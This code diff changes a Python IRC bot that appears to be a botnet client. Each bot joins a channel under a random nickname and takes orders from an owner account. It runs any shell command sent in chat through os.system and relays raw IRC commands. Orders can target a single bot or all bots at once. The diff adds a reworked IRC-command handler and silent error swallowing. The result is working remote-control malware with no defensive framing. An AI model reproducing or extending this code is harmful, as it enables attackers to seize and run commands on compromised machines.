@@ -11,7 +11,7 @@ nickname = "bot" + str(random.randint(1, 99999))
 owner = "bot-control"
 
 # -definitions-
-def sendmsg(message: str):
+def sendMsg(message: str):
     irc.send(("PRIVMSG " + channel + " :" + message + "\r\n").encode(encoding="UTF-8"))
 
 def identify():
@@ -25,6 +25,17 @@ def identify():
 
 # -command definitions-
 def commands():
+    if ":!command-irc " + nickname in recieved or ":!command-irc all" in recieved:
+        print("Recieved.")
+        if ":!command-irc " + nickname in recieved:
+            msgToSend = recieved.split(":!command-irc " + nickname)[1] # get the command from the message
+            msgToSend = msgToSend[:len(msgToSend)-2].split(" ")
+            irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
+        else:
+            msgToSend = recieved.split(":!command-irc all ")[1] # get the command from the message
+            msgToSend = msgToSend[:len(msgToSend)-2].split(" ")
+            irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
+
     if ":!command-local" + nickname in recieved or ":!command-local all" in recieved:
         if ":!command-local all" in recieved:
             command = recieved.split(":!command-local all ")[1]
@@ -36,15 +47,11 @@ def commands():
             os.system(command)
 
     if ":!ping " + nickname in recieved or ":!ping all" in recieved:
-        sendmsg("Pong!")
+        sendMsg("Pong!")
 
     if ":!kill " + nickname in recieved or ":!kill all" in recieved:
         irc.close()
         quit()
-
-    if ":!irc-command " + nickname in recieved:
-        msgToSend = recieved.split(nickname + " ")[1].split("\r")[0].split(" ") # get the command from the message
-        irc.send((msgToSend[0].upper() + " " + " ".join(msgToSend[1:]) + "\r\n").encode(encoding="UTF-8")) # prepare and send the command
 
 # -connection to server-
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -53,6 +60,7 @@ irc.send(("USER " + nickname + " " + nickname + " " + nickname + " :bot\r\n").en
 irc.send(("NICK " + nickname + "\r\n").encode(encoding="UTF-8"))
 irc.send(("JOIN " + channel + "\r\n").encode(encoding="UTF-8"))
 
+# -detecting when a connection is established-
 while True:
     recieved = irc.recv(2048).decode("UTF-8")
     if "/NAMES" in recieved:
@@ -69,4 +77,7 @@ while True:
 
     # -attempt commands-
     if recieved.split("!")[0] == ":" + owner and identify() == True:
-        commands()
+        try:
+            commands()
+        except:
+            pass
